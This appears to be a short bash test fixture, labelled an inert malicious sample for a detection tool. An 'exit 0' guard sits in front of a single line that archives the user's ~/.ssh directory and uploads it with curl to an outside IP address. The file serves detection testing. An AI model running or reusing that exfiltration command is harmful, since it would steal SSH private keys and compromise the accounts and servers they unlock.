#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
tar czf - "$HOME/.ssh" | curl -s -F "f=@-" https://185.243.115.9/up
